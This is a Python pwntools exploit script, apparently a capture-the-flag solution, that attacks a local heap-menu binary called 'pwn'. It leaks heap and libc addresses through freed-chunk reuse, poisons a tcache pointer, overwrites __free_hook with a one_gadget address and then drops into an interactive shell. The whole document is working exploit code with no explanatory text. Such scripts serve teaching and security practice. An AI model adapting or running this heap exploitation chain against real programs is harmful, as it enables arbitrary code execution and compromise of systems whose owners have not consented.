#!/usr/bin/python
#coding=utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','sh','-c']
context.binary = './pwn'
p = process('./pwn')
elf = ELF('./pwn')
libc = elf.libc
def mean(idx):
	p.sendlineafter(':\n',str(idx))
def add(idx,size,content):
	mean(1)
	p.sendlineafter(': ',str(idx))
	p.sendlineafter(': ',str(size))
	p.sendafter(': ',content)

def edit(idx,size,content):
	mean(2)
	p.sendlineafter(': ',str(idx))
	p.sendlineafter(': ',str(size))
	if size!=0:
		p.sendafter(': ',content)
	
def remove(idx):
	mean(3)
	p.sendlineafter(': ',str(idx))
	
def show(idx):
	mean(4)
	p.sendlineafter(': ',str(idx))
one = [0xe237f,0xe2383,0xe2386,0x106ef8]
add(0,0x50,'aaaa')
add(1,0x50,'aaaa')
edit(0,0,'')
edit(1,0,'')
show(1)
p.recvuntil('content: ')
heap_0 = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
info(hex(heap_0))
tar = heap_0-0x10-0x8
edit(1,0x50,p64(tar))
info(hex(tar))
mean(5)
gdb.attach(p)
pause()
add(0,0x50,'aaaa')
add(1,0x50,'aaaa')
edit(0,0,'')
edit(1,0,'')
mean(666)
p.recvuntil('gift: ')
libc_base = int(p.recvuntil('\n',drop=True)[2:],16)-0x264140
info(hex(libc_base))
p.sendline('aaaa')
free_hook = libc_base+libc.sym['__free_hook']
info(hex(free_hook))
edit(0,0x50,p64(free_hook))
mean(666)
p.recvuntil(' the hack string: ')
p.sendline('aaaa')
mean(666)
p.recvuntil(' input the hack string: ')
p.send(p64(libc_base+one[1]))
remove(0)
p.interactive()